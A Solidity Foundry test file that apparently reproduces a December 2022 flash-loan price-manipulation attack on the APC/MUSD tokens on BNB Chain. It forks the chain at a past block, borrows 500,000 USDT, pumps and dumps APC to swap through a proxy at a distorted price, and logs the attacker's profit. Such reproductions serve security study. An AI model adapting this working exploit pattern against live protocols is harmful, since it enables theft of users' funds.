// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1598262002010378241
// @TX
// https://bscscan.com/tx/0xbcaecea2044101c80f186ce5327bec796cd9e054f0c240ddce93e2aead337370 first attack
// https://bscscan.com/tx/0xf2d4559aeb945fb8e4304da5320ce6a2a96415aa70286715c9fcaf5dbd9d7ed2 second attack

interface TransparentUpgradeableProxy {
    function swap(address a1, address a2, uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 APC = IERC20(0x2AA504586d6CaB3C59Fa629f74c586d78b93A025);
    IERC20 MUSD = IERC20(0x473C33C55bE10bB53D81fe45173fcc444143a13e);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    TransparentUpgradeableProxy transSwap = TransparentUpgradeableProxy(0x5a88114F02bfFb04a9A13a776f592547B3080237);
    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_527_906);
    }

    function testExploit() public {
        APC.approve(address(Router), type(uint256).max);
        APC.approve(address(transSwap), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        MUSD.approve(address(transSwap), type(uint256).max);
        DVM(dodo).flashLoan(0, 500_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        USDTToAPC(); // Pump APC token price
        transSwap.swap(address(APC), address(MUSD), 100_000 * 1e18); // APC swap to MUSD with incorrect price, get more MUSD
        APCToUSDT(); // Dump APC token price
        transSwap.swap(address(MUSD), address(APC), MUSD.balanceOf(address(this))); // MUSD swap to APC with normal price
        APCToUSDT(); // sell the obtained of APC
        USDT.transfer(dodo, 500_000 * 1e18);
    }

    function USDTToAPC() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(APC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function APCToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(APC);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            APC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
